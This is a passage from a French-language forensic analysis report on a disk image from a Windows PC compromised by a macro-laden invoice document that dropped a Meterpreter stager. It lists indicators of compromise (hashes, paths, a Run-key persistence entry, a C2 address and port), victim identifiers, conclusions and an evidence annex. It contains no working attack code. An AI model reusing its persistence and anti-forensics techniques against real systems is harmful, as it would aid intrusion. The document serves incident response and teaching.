| 13:38:22 | NTFS - RGoEsDNcZhEnl.exe | Nouveau payload depose |
| 13:38:23 | NTFS - tior.exe | Executable supplementaire depose |
| 13:48-13:51 | Shellbags - E:\ | **Capture disque avec FTK Imager** |
| **14:05-14:19** | **FTK Imager log** | **Acquisition de l'image disque HD_Evidence01** |

---

## 14. Indicateurs de compromission (IOCs)

### 14.1 Fichiers malveillants

| Fichier | Chemin | MD5 | SHA256 | Taille |
|---------|--------|-----|--------|--------|
| `invoice.docm` | `C:\Users\johnoc\Downloads\invoice\` | `775186db727a3218ea45a3bcd51072aa` | `fb897c9c6dcfef94e6a2cea168ff19bd448af3205b19aeaed2d4ed5df1354452` | 84 Ko |
| `rad5163B.tmp.exe` | `C:\Users\johnoc\AppData\Local\Temp\` | `4cad3dd76239f6c03404c59392cd6a1d` | `61b06712f6851338bccd2f9ea72262fd2d4b6dcee69283377768ed94d26641d9` | 73802 octets |
| `krtYMkVgyjNdd.vbs` | `C:\Users\johnoc\AppData\Local\Temp\` | *(calcule sur l'extrait)* | - | 99623 octets |
| `bVwHCYX.exe` | `C:\Users\johnoc\AppData\Local\Temp\` | `82275565ecb591e5264fc705b43fbbd8` | - | 73802 octets |
| `RGoEsDNcZhEnl.exe` | `C:\Users\johnoc\AppData\Local\Temp\` | `c31852836acbbec2101824999b482de3` | - | 406016 octets |
| `tior.exe` | `C:\Users\johnoc\AppData\Local\Temp\` | `6b0ed4e1b6d76644ad78aea147b8419a` | - | 91648 octets |
| `rfhyMVOQxfc.exe` | `C:\Users\johnoc\AppData\Local\Temp\<alea>\` | *(supprime)* | - | *inconnu* |

### 14.2 Cles de registre

| Cle | Valeur | Donnee |
|-----|--------|--------|
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | `YPDKhVAXzZSU` | `C:\Users\johnoc\AppData\Local\Temp\krtYMkVgyjNdd.vbs` |

### 14.3 Indicateurs reseau (confirmes par Partie 4)

| Indicateur | Type | Description |
|------------|------|-------------|
| `172.16.169.164` | IP C2 | Serveur de commande et controle attaquant |
| `4444/TCP` | Port | Port Meterpreter reverse shell |

### 14.4 Identifiants de la machine victime

| Parametre | Valeur |
|-----------|--------|
| Nom machine | `johnoc-PC` |
| Utilisateur | `johnoc` |
| Email | `john.opoc2@gmail.com` |
| Volume Serial | `A0326AE1326ABC42` |
| SID utilisateur | `S-1-5-21-4052921086-732667259-1946374124-1000` |
| Heure compromission | 2019-07-31 12:45:47 UTC |

---

## 15. Conclusion

L'analyse de l'image disque `HD_Evidence01` (CASE001) **confirme et documente sur disque** la compromission de la machine `johnoc-PC` identifiee par l'analyse memoire (Partie 4). Les preuves extraites du disque apportent des elements complementaires et independants :

**1. Vecteur d'attaque documente :** Le fichier `invoice.zip` a ete telecharge depuis internet (ZoneId=3) le 31/07/2019 a 12:44:00 UTC. L'archive contenait `invoice.docm` (document Word avec macro) et `invoice.pdf` (leurre). La trace NTFS (timestamps + RecentDocs + Shellbags) confirme toute la chaine d'evenements.

**2. Payload identifie et hache :** Le binaire `rad5163B.tmp.exe` (PE32 Windows GUI, 73802 octets, MD5: `4cad3dd76239f6c03404c59392cd6a1d`) a ete extrait et identifie comme le stager Meterpreter depose par la macro. Son heure de creation (12:45:47 UTC) correspond a la seconde pres avec les observations de la Partie 4.

**3. Persistance prouvee par le registre :** La cle `HKCU\Run\YPDKhVAXzZSU` a ete ajoutee a 12:53:57 UTC pour executer `krtYMkVgyjNdd.vbs` a chaque demarrage. Ce script VBS (97 KB, obfusque) embarque le payload `rfhyMVOQxfc.exe` en Base64, le redeploit en boucle toutes les 5 secondes, et supprime les traces apres execution.

**4. Technique d'evasion documentee :** La suppression systematique de `rfhyMVOQxfc.exe` apres chaque execution (visible dans le code VBS), l'utilisation de noms aleatoires, et la suppression du `memdump.mem` de la Corbeille demontrent une connaissance des techniques anti-forensics par l'attaquant.

**5. Coherence avec la Partie 4 :** Toutes les heures, noms de fichiers, et comportements observes dans le dump memoire (Partie 4) sont confirmes et dates avec precision par les artefacts disque.

---

## 16. Annexe - Fichiers de preuves

| # | Fichier | Description |
|---|---------|-------------|
| 00 | `evidence/00_segment_hashes_md5.txt` | Hashes MD5 des 18 segments de l'image |
| 01 | `evidence/01_partition_table.txt` | Table des partitions (mmls) |
| 02 | `evidence/02_fsstat_sysreserved.txt` | Infos filesystem partition System Reserved |
| 03 | `evidence/03_fsstat_main.txt` | Infos filesystem partition principale NTFS |
| 04 | `evidence/04_root_listing.txt` | Listing racine NTFS (fls) |
| 05 | `evidence/05_users_dir.txt` | Listing dossier Users |
| 06 | `evidence/06_johnoc_home.txt` | Listing home de johnoc |
| 07 | `evidence/07_desktop.txt` | Contenu Bureau (Desktop) |
| 08 | `evidence/08_documents.txt` | Contenu Documents |
| 09 | `evidence/09_downloads.txt` | Contenu Downloads avec timestamps |
| 10 | `evidence/10_invoice_dir.txt` | Contenu dossier invoice/ |
| 11 | `evidence/11_invoice_zip_zone.txt` | Zone.Identifier de invoice.zip |
| 12 | `evidence/12_invoice_docm_zone.txt` | Zone.Identifier de invoice.docm (ZoneId=3) |
| 13 | `evidence/13_appdata_local.txt` | Listing AppData/Local |
| 14 | `evidence/14_temp_dir.txt` | Listing %TEMP% complet |
| 15 | `evidence/15_krtYMkVgyjNdd.vbs` | Script VBS malveillant extrait |
| 16 | `evidence/16_vbe_dir.txt` | Contenu dossier VBE |
| 17 | `evidence/17_prefetch.txt` | Listing Prefetch Windows |
| 18 | `evidence/18_event_logs_list.txt` | Liste des fichiers .evtx |
| 19 | `evidence/19_security_events_july31.txt` | Evenements Security.evtx du 31/07 |
| 20 | `evidence/20_system_events_july31.txt` | Evenements System.evtx du 31/07 |
| 21 | `evidence/21_regripper_userassist.txt` | UserAssist (programmes executes) |
| 22 | `evidence/22_regripper_run.txt` | Cles Run autostart (**PERSISTANCE**) |
| 23 | `evidence/23_regripper_runmru.txt` | RunMRU (commandes executees) |
| 24 | `evidence/24_shellbags.txt` | Shellbags (navigation dossiers) |
| 25 | `evidence/25_recycle_bin.txt` | Contenu Corbeille |
| 26 | `evidence/26_temp_malware_timestamps.txt` | Timestamps NTFS des malwares dans %TEMP% |
| 27 | `evidence/27_regripper_typedurls.txt` | URLs tapees dans IE |
| 28 | `evidence/28_regripper_mndmru.txt` | Lecteurs reseau mappes |
| - | `evidence/Security.evtx` | Journal securite extrait |
| - | `evidence/System.evtx` | Journal systeme extrait |
| - | `evidence/PowerShell-Operational.evtx` | Journal PowerShell extrait |
| - | `evidence/NTUSER.DAT` | Ruche registre utilisateur |
| - | `evidence/SAM` | Ruche SAM |
| - | `evidence/SYSTEM` | Ruche SYSTEM |
| - | `evidence/UsrClass.dat` | Ruche UsrClass (shellbags) |
| - | `evidence/malware_samples/invoice.docm` | Document malveillant extrait |
| - | `evidence/malware_samples/rad5163B.tmp.exe` | Payload Meterpreter initial extrait |
| - | `evidence/malware_samples/bVwHCYX.exe` | Second stager extrait |
| - | `evidence/malware_samples/RGoEsDNcZhEnl.exe` | Second payload extrait |
| - | `evidence/malware_samples/tior.exe` | Executable supplementaire extrait |
